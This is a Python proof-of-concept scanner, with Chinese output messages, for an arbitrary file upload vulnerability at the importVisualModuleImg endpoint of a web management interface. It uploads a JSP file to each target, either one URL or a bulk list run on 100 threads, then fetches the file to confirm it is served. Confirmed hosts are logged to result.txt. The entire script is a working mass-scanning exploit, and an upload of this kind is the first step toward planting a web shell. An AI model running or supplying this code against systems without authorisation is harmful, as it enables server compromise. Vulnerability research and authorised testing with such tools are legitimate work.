import argparse
import requests
import os
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 

                                                                                       
 _                   _   _____ _             _ _____       _     _     _____           
|_|_____ ___ ___ ___| |_|  |  |_|___ _ _ ___| |     |___ _| |_ _| |___|     |_____ ___ 
| |     | . | . |  _|  _|  |  | |_ -| | | .'| | | | | . | . | | | | -_|-   -|     | . |
|_|_|_|_|  _|___|_| |_|  \___/|_|___|___|__,|_|_|_|_|___|___|___|_|___|_____|_|_|_|_  |
        |_|                                                                       |___|
   
                                                   author:sanhua
                                                   date:2024-09-05
                                                   version:1.0
"""
    print(test)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="importVisualModuleImg接口任意文件上传漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t 存在接口任意文件上传漏洞")


def poc(target):
    payload = "/manage/tplresource/importVisualModuleImg?moduleId=2"
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9b48b67cf71",
        "Content-Length": "198",
    }

    data = (
        "------9979a3f1-cdb1-43af-af88-a9b48b67cf71\r\n"
        'Content-Disposition: form-data; name="file"; filename="tmp.jsp"\r\n'
        "Content-Type: multipart/form-data\r\n"
        "\r\n"
        "6666\r\n"
        "------9979a3f1-cdb1-43af-af88-a9b48b67cf71--\r\n"
    )
    payload1 ="/files/visual/img/2/tmp.jsp"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data, verify=False)
        if response.status_code == 200:
            res1 = requests.post(target + payload1, verify=False)
            if res1.status_code == 200 and res1.text == "6666":
                print(f"[!] {target} 存在importVisualModuleImg接口任意文件上传漏洞")
                with open("result.txt", 'a',encoding='utf-8') as f:
                    f.write(f"{target} 存在importVisualModuleImg接口任意文件上传漏洞\n")
            else:
                print(f"[!] {target} 未检测到importVisualModuleImg接口任意文件上传漏洞")
        else:
            print(f"[!] {target} 未检测到importVisualModuleImg接口任意文件上传漏洞")
    except Exception as e:
        print(f"[!] {target} 未检测到importVisualModuleImg接口任意文件上传漏洞")
        print(e)


if __name__ == '__main__':
    main()
